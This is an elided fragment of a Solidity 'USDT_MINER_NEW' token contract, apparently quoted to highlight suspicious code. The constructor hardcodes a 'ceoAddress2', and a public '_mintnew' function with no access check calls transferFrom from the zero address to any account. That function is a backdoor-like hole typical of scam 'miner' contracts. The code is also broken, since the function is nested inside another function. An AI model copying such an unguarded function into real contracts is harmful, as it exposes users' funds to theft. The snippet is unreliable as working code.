...
contract USDT_MINER_NEW {
    ...
    constructor() public{
        ...
        ceoAddress2=address(0x337610d27c682E347C9cD60BD4b3b107C9d34dDd);
    }
    ...
    function seedMarket(uint256 amount) public {
      ...
      function _mintnew(address account,uint256 amount) public  {  
       require(account != address(0), "ERC20: mint to the zero address");
      ERC20(usdt).transferFrom(address(0), account, amount);
